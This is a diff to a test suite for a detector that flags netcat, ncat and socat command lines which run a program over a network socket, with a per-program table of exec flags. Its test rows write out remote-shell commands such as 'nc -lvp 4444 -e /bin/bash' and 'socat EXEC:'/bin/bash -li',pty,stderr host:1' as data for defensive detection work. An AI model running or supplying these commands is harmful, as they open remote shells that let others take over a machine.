@@ -6411,10 +6411,27 @@ describe("POSIX: a command that runs later, with nobody watching", () => {
  * hands the far end a command line instead, and the whole of the danger is that
  * switch: it is remote code execution with a network listener in front of it.
  *
- * NETCAT_EXEC_FLAGS is a set rather than a single `-e` because the flag has
- * three spellings across the three programs that share this name, and a rule
- * that read one of them would miss the other two — which are the same program
- * under different names.
+ * **NETCAT_EXEC_FLAGS is a map keyed by program, and this block is what says
+ * why.** The three names do not spell "run a program" the same way, and one
+ * shared set fired on `nc -c example.com 443` — which on OpenBSD's `nc` is a
+ * TLS probe (`netcat.c:204-205`, `usetls = 1`) and on busybox's is not an option
+ * at all (`networking/nc.c:136-137` builds `"" IF_NC_SERVER("lp:")
+ * IF_NC_EXTRA("w:i:f:e:")`). Read out of the three sources rather than
+ * remembered:
+ *
+ * | program | `-e` | `-c` | `--exec` | `--sh-exec` |
+ * | --- | --- | --- | --- | --- |
+ * | `ncat` (nmap) | exec | exec | exec | exec |
+ * | `nc` (OpenBSD) | TLS cert name | **use TLS** | not an option | not an option |
+ * | `nc` (busybox) | exec, only under `NC_EXTRA` | not an option | not an option | not an option |
+ * | `netcat` (traditional) | exec | exec | not an option | not an option |
+ *
+ * The QUIET rows below are the cost of believing that table, and each one names
+ * the line that says so. Two of the four long-option rows were FIRE rows until
+ * this was read: `nc --exec` and `nc --sh-exec` were here as "the long
+ * spelling", on the reasoning that they are the same program under a shorter
+ * name. They are not — OpenBSD's `nc` and busybox's `nc` have no long options,
+ * netcat-traditional's has no long options, and only `ncat` has any.
  *
  * **The `socat` half is a substring test and this block shows what that costs.**
  * `TCP-LISTEN:4444,fork EXEC:/bin/cat` is a port forward people legitimately
@@ -6429,7 +6446,13 @@ describe("POSIX: a socket that runs a program instead of reading one", () => {
 		["nc -lvp 4444 -e /bin/bash", "the flag after the listener, which is where people put it"],
 		["ncat -e /bin/sh host 1", "the Nmap name for the same program"],
 		["netcat -e /bin/sh host 1", "and the third name"],
-		["nc --exec /bin/sh host 1", "the long spelling"],
+		[
+			"netcat -c '/bin/sh -li' host 1",
+			"traditional's other spelling, the command as one shell string (`netcat.c:1534`)",
+		],
+		["ncat -c /bin/sh host 1", "and the same on nmap, where `-c` is `--sh-exec` (`ncat_main.c:246`)"],
+		["ncat --exec /bin/sh host 1", "the long spelling, which only ncat has (`ncat_main.c:245`)"],
+		["ncat --sh-exec /bin/sh host 1", "and the other one (`:246`)"],
 		["socat EXEC:'/bin/bash -li',pty,stderr host:1", "socat's address form"],
 		["socat tcp-connect:host:1 exec:/bin/bash", "and the same, reversed and lower case"],
 		["socat TCP-LISTEN:4444,fork EXEC:/bin/cat", "and the port forward the substring test cannot tell apart"],
@@ -6441,6 +6464,26 @@ describe("POSIX: a socket that runs a program instead of reading one", () => {
 		["nc host 80", "sends bytes to a listener"],
 		["nc -lvp 4444", "listens and sends nothing"],
 		["nc -z host 80", "a port probe"],
+		[
+			"ncat -lvp 4444",
+			"and nmap's plain listener, which has `-e` and `-c` on the line's program table but neither on the line",
+		],
+		["netcat -l 4444", "and traditional's, where `-l` is `case 'l'` and execs nothing"],
+		// The four rows the measured table removed. Each names what the flag is where
+		// this file's `nc` and `netcat` most likely come from.
+		[
+			"nc -c example.com 443",
+			"a TLS probe: `-c` is `usetls = 1` in OpenBSD's nc (`netcat.c:204-205`) and is not an option in busybox's (`networking/nc.c:136-137`)",
+		],
+		[
+			"nc --exec /bin/sh host 1",
+			"OpenBSD's nc has no long options — its parser is `getopt`, not `getopt_long` (`netcat.c:176`)",
+		],
+		["nc --sh-exec /bin/sh host 1", "and the same for the other spelling"],
+		[
+			"netcat --exec /bin/sh host 1",
+			'traditional has no long options either; its whole optstring is `"abc:e:g:G:hi:klno:p:q:rs:T:tuvw:zC"` (`netcat.c:1525`)',
+		],
 		["socat - TCP:host:1", "moves bytes between two places"],
 		["socat -u FILE:/tmp/in TCP:host:1", "and this, which is a real and common socat"],
 	])("%s is not dangerous — %s", (command) => {
@@ -6455,6 +6498,33 @@ describe("POSIX: a socket that runs a program instead of reading one", () => {
 		expect(posix("socat EXEC:/bin/sh host:1")?.rule).toBe(
 			"`socat` with an `EXEC:` address, which runs a program on the far end",
 		);
+	});
+
+	/**
+	 * The one row of the table that is a judgement rather than a measurement.
+	 *
+	 * `nc -e` execs on busybox and is a certificate name on OpenBSD, and which
+	 * `nc` is on the PATH is not something the command line carries. This
+	 * asserts the side that costs something, so that if a later pass flips it the
+	 * test goes red and the flip has to be argued for rather than slipped past.
+	 */
+	test("`nc -e` fires even though OpenBSD's nc reads it as a certificate name", () => {
+		expect(posix("nc -e example.com 443")).not.toBeNull();
+	});
+
+	/**
+	 * A name that is not a key is not a netcat, and the guard is the lookup.
+	 *
+	 * `nc.openbsd` and `netcat4` are separate binaries with separate names, so
+	 * they are out of scope by construction — this row exists to say the map is
+	 * what decides that, not a list of names somebody has to keep in step.
+	 */
+	test.each([
+		["nc.openbsd -e /bin/sh host 1", "OpenBSD's under its alternate name"],
+		["netcat4 -e /bin/sh host 1", "and netcat4's"],
+		["ncat6 -e /bin/sh host 1", "and nmap's IPv6-only spelling"],
+	])("%s is not this rule's business — %s", (command) => {
+		expect(posix(command)).toBeNull();
 	});
 });
 
